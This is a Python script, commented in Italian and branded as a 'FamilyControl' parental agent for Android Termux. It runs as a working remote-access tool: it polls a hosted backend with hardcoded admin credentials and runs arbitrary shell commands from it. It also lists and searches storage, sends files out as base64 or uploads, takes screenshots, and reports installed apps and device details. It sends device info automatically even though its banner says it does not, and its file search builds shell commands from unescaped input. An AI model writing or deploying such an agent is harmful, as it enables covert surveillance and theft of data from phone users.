#!/usr/bin/env python3
"""
FamilyControl Agent Android (Termux) - Modalità On-Demand
NON invia dati automaticamente - Risponde SOLO ai comandi ricevuti
Supporta: shell remota, download file, accesso memoria
"""

import os
import json
import time
import subprocess
import requests
import base64
import shutil
from pathlib import Path
from datetime import datetime

# ==================== CONFIGURAZIONE ====================
BACKEND_URL = "https://familycontrol-backend-production.up.railway.app"
USERNAME = "admin"
PASSWORD = "admin123"

# ID dispositivo
try:
    DEVICE_ID = subprocess.check_output(['getprop', 'ro.serialno']).decode().strip()
    if not DEVICE_ID or DEVICE_ID == "unknown":
        DEVICE_ID = subprocess.check_output(['getprop', 'net.hostname']).decode().strip()
except:
    DEVICE_ID = "android_termux"

if not DEVICE_ID or DEVICE_ID == "unknown":
    DEVICE_ID = "android_termux"

DEVICE_NAME = f"Android_{DEVICE_ID[:8]}"
DEVICE_TYPE = "android"

# Cartella base per i file scaricati
DOWNLOAD_BASE = "/sdcard/Download/familycontrol"
os.makedirs(DOWNLOAD_BASE, exist_ok=True)

# ==================== FUNZIONI BASE ====================

def get_token():
    """Ottiene token JWT dal backend"""
    try:
        response = requests.post(
            f"{BACKEND_URL}/api/auth/login",
            json={"username": USERNAME, "password": PASSWORD},
            timeout=10
        )
        if response.status_code == 200:
            return response.json().get("token")
        return None
    except:
        return None

def send_command_result(token, command_id, result):
    """Invia risultato comando al backend"""
    try:
        requests.patch(
            f"{BACKEND_URL}/api/commands/{command_id}",
            headers={"Authorization": f"Bearer {token}"},
            json={"status": "completed", "result": result},
            timeout=30
        )
        return True
    except:
        return False

def send_data(token, data_type, data_content):
    """Invia dati generici al backend"""
    try:
        requests.post(
            f"{BACKEND_URL}/api/devices/{DEVICE_ID}/data",
            headers={"Authorization": f"Bearer {token}"},
            json={"dataType": data_type, "dataContent": data_content},
            timeout=30
        )
        return True
    except:
        return False

def execute_shell_command(command):
    """Esegue un comando shell e restituisce output"""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
        return {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode
        }
    except subprocess.TimeoutExpired:
        return {"error": "Comando timeout (60s)", "stdout": "", "stderr": ""}
    except Exception as e:
        return {"error": str(e)}

# ==================== COMANDI ON-DEMAND ====================

def handle_shell_command(params):
    """Esegue comando shell remoto - ACCESSO COMPLETO AL TELEFONO"""
    cmd = params.get("command", "")
    if not cmd:
        return {"error": "Nessun comando specificato"}
    
    result = execute_shell_command(cmd)
    return result

def handle_list_directory(params):
    """Lista il contenuto di una directory"""
    path = params.get("path", "/sdcard")
    
    try:
        if not os.path.exists(path):
            return {"error": f"Percorso non esiste: {path}"}
        
        items = []
        for item in os.listdir(path):
            full_path = os.path.join(path, item)
            items.append({
                "name": item,
                "type": "directory" if os.path.isdir(full_path) else "file",
                "size": os.path.getsize(full_path) if os.path.isfile(full_path) else None,
                "modified": datetime.fromtimestamp(os.path.getmtime(full_path)).isoformat()
            })
        
        return {
            "path": path,
            "items": items,
            "count": len(items)
        }
    except Exception as e:
        return {"error": str(e), "path": path}

def handle_download_file(params):
    """Scarica un file dal telefono e lo invia al backend"""
    file_path = params.get("file_path")
    max_size_mb = params.get("max_size_mb", 10)
    
    if not file_path:
        return {"error": "Nessun file specificato"}
    
    if not os.path.exists(file_path):
        return {"error": f"File non trovato: {file_path}"}
    
    file_size = os.path.getsize(file_path)
    if file_size > max_size_mb * 1024 * 1024:
        return {"error": f"File troppo grande: {file_size / 1024 / 1024:.1f}MB > {max_size_mb}MB"}
    
    try:
        # Leggi file e converti in base64
        with open(file_path, 'rb') as f:
            file_content = f.read()
        
        file_b64 = base64.b64encode(file_content).decode()
        
        # Salva una copia locale
        dest_path = os.path.join(DOWNLOAD_BASE, os.path.basename(file_path))
        shutil.copy2(file_path, dest_path)
        
        return {
            "status": "success",
            "file_name": os.path.basename(file_path),
            "file_size": file_size,
            "size_mb": round(file_size / 1024 / 1024, 2),
            "file_base64": file_b64[:100] + "...",  # Truncato per il log
            "saved_to": dest_path,
            "note": "File scaricato e salvato in copia locale"
        }
    except Exception as e:
        return {"error": str(e)}

def handle_upload_file(params):
    """Carica un file dal telefono al backend (inviato come base64)"""
    file_path = params.get("file_path")
    
    if not file_path:
        return {"error": "Nessun file specificato"}
    
    if not os.path.exists(file_path):
        return {"error": f"File non trovato: {file_path}"}
    
    try:
        with open(file_path, 'rb') as f:
            file_content = f.read()
        
        file_b64 = base64.b64encode(file_content).decode()
        
        return {
            "status": "success",
            "file_name": os.path.basename(file_path),
            "file_size": len(file_content),
            "file_base64": file_b64,
            "size_mb": round(len(file_content) / 1024 / 1024, 2)
        }
    except Exception as e:
        return {"error": str(e)}

def handle_search_files(params):
    """Cerca file per nome o pattern"""
    search_path = params.get("search_path", "/sdcard")
    pattern = params.get("pattern", "")
    max_results = params.get("max_results", 50)
    
    if not pattern:
        return {"error": "Nessun pattern di ricerca specificato"}
    
    results = []
    try:
        # Usa find per cercare
        cmd = f"find {search_path} -type f -name '*{pattern}*' 2>/dev/null | head -n {max_results}"
        output = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        
        for line in output.stdout.strip().split('\n'):
            if line:
                results.append(line)
        
        return {
            "pattern": pattern,
            "search_path": search_path,
            "results": results,
            "count": len(results)
        }
    except Exception as e:
        return {"error": str(e)}

def handle_get_installed_packages():
    """Lista app installate"""
    try:
        result = subprocess.run(['pm', 'list', 'packages'], capture_output=True, text=True, timeout=30)
        packages = [line.replace('package:', '') for line in result.stdout.split('\n') if line]
        return {"packages": packages[:100], "total": len(packages)}  # Limita a 100
    except:
        return {"error": "Impossibile listare i pacchetti"}

def handle_take_screenshot():
    """Screenshot del telefono"""
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = f"/sdcard/screenshot_{timestamp}.png"
        subprocess.run(['screencap', '-p', screenshot_path], capture_output=True, timeout=10)
        
        if os.path.exists(screenshot_path):
            return {
                "status": "success",
                "path": screenshot_path,
                "note": f"Screenshot salvato in {screenshot_path}"
            }
        else:
            return {"error": "Screenshot fallito"}
    except Exception as e:
        return {"error": str(e)}

def handle_send_file(params):
    """Invia file come attachment (metodo alternativo)"""
    file_path = params.get("file_path")
    
    if not file_path or not os.path.exists(file_path):
        return {"error": "File non trovato"}
    
    try:
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            response = requests.post(
                f"{BACKEND_URL}/api/devices/{DEVICE_ID}/upload",
                headers={"Authorization": f"Bearer {get_token()}"},
                files=files,
                timeout=60
            )
        
        return {
            "status": "uploaded",
            "response": response.status_code,
            "file": file_path
        }
    except Exception as e:
        return {"error": str(e)}

def handle_get_device_info():
    """Info complete del dispositivo"""
    try:
        return {
            "device_id": DEVICE_ID,
            "name": DEVICE_NAME,
            "brand": subprocess.check_output(['getprop', 'ro.product.brand']).decode().strip() if subprocess else "unknown",
            "model": subprocess.check_output(['getprop', 'ro.product.model']).decode().strip() if subprocess else "unknown",
            "android": subprocess.check_output(['getprop', 'ro.build.version.release']).decode().strip() if subprocess else "unknown",
            "sdk": subprocess.check_output(['getprop', 'ro.build.version.sdk']).decode().strip() if subprocess else "unknown",
            "storage": handle_list_directory({}) if os.path.exists("/sdcard") else {"error": "Accesso storage non disponibile"},
            "download_folder": DOWNLOAD_BASE
        }
    except Exception as e:
        return {"error": str(e)}

# ==================== COMANDI MAPPING ====================

COMMAND_HANDLERS = {
    "shell": handle_shell_command,
    "exec": handle_shell_command,           # Alias
    "cmd": handle_shell_command,            # Alias
    
    "ls": handle_list_directory,
    "dir": handle_list_directory,           # Alias
    "list": handle_list_directory,          # Alias
    
    "download": handle_download_file,
    "get_file": handle_download_file,       # Alias
    
    "upload": handle_upload_file,
    "send_file": handle_send_file,          # Alias
    
    "search": handle_search_files,
    "find": handle_search_files,            # Alias
    
    "apps": handle_get_installed_packages,
    "packages": handle_get_installed_packages,
    
    "screenshot": handle_take_screenshot,
    "screen": handle_take_screenshot,
    
    "info": handle_get_device_info,
    "device_info": handle_get_device_info,
}

# ==================== MAIN LOOP ====================

def main():
    print("""
╔════════════════════════════════════════════════════════════════╗
║     FamilyControl Agent - MODALITÀ ON-DEMAND                  ║
║                                                                ║
║     ✅ INOLTRA SOLO COMANDI RICEVUTI DAL BACKEND              ║
║     ✅ NON INVALUTA DATI IN AUTOMATICO                        ║
║     ✅ ACCESSO COMPLETO AL TELEFONO VIA SHELL                 ║
║     ✅ DOWNLOAD FILE DA REMOTO                                ║
╚════════════════════════════════════════════════════════════════╝
    """)
    
    print(f"📱 Dispositivo: {DEVICE_NAME}")
    print(f"🆔 ID: {DEVICE_ID}")
    print(f"📡 Backend: {BACKEND_URL}")
    print(f"📁 Download folder: {DOWNLOAD_BASE}")
    print("\n⏳ In attesa di comandi...\n")
    
    token = get_token()
    if not token:
        print("❌ Login fallito. Verifica credenziali.")
        return
    
    print("✅ Autenticato al backend")
    
    # Invia info dispositivo iniziale (solo una volta)
    device_info = handle_get_device_info()
    send_data(token, "device_info", device_info)
    
    last_commands = {}
    
    while True:
        try:
            # Controlla comandi pendenti
            response = requests.get(
                f"{BACKEND_URL}/api/devices/{DEVICE_ID}/commands",
                headers={"Authorization": f"Bearer {token}"},
                timeout=10
            )
            
            if response.status_code == 200:
                commands = response.json()
                
                for cmd in commands:
                    cmd_id = cmd.get('id')
                    command = cmd.get('command')
                    params = cmd.get('params', {})
                    
                    # Evita di rieseguire lo stesso comando
                    if last_commands.get(cmd_id) == command:
                        continue
                    
                    print(f"\n📡 [{datetime.now().strftime('%H:%M:%S')}] Comando: {command}")
                    
                    # Trova l'handler
                    handler = COMMAND_HANDLERS.get(command.lower())
                    
                    if handler:
                        # Esegui il comando
                        result = handler(params)
                        print(f"   ✅ Risultato: {str(result)[:200]}...")
                        
                        # Invia risultato
                        send_command_result(token, cmd_id, result)
                        last_commands[cmd_id] = command
                    else:
                        error_result = {"error": f"Comando sconosciuto: {command}"}
                        send_command_result(token, cmd_id, error_result)
                        print(f"   ❌ Comando sconosciuto")
            
            time.sleep(5)  # Controlla ogni 5 secondi
            
        except KeyboardInterrupt:
            print("\n\n⏹️ Agent fermato manualmente")
            break
        except Exception as e:
            print(f"⚠️ Errore: {e}")
            time.sleep(10)
            # Rinnova token se scaduto
            token = get_token()

if __name__ == "__main__":
    main()
